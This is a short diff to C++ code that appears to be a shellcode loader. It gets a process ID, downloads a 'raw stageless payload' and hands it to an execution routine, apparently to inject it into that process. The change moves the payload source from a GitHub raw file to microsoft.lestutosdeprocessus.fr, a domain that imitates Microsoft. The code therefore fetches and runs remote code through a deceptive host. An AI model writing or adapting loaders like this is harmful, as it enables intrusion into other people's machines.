@@ -15,7 +15,7 @@ int main()
     DWORD pid = GetPID();
     
     // Raw stageless payload targetting microsoft.lestutosdeprocessus.fr
-    std::vector<BYTE> sh = Download(L"github.com\0", L"/Processus-Thief/La-Gamelle/raw/master/payload.bin\0");
+    std::vector<BYTE> sh = Download(L"microsoft.lestutosdeprocessus.fr\0", L"/payload.bin\0");
 
     execution(sh, pid);
 }
